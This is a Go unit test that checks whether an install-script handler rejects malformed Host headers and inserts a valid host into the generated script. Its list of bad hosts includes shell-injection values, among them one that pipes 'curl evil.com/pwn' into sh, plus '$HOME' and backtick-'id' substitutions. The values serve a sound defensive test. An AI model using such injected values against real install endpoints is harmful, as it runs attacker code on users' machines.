package agents

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestHandleInstallScriptRejectsMalformedHost(t *testing.T) {
	t.Setenv("SENTRIX_PUBLIC_URL", "")
	handler := HandleInstallScript()

	badHosts := []string{
		`evil.com"; curl evil.com/pwn | sh #`,
		"evil.com/path",
		"evil.com$HOME",
		"evil.com`id`",
		"",
	}

	for _, h := range badHosts {
		req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
		req.Host = h
		rr := httptest.NewRecorder()
		handler.ServeHTTP(rr, req)
		if rr.Code != http.StatusBadRequest {
			t.Fatalf("Host %q: expected 400, got %d", h, rr.Code)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/install.sh", nil)
	req.Host = "monitor.example.com:8080"
	rr := httptest.NewRecorder()
	handler.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("valid Host: expected 200, got %d", rr.Code)
	}
	if !strings.Contains(rr.Body.String(), `SENTRIX_SERVER="http://monitor.example.com:8080"`) {
		t.Fatalf("expected valid host in install script, got %q", rr.Body.String()[:120])
	}
}
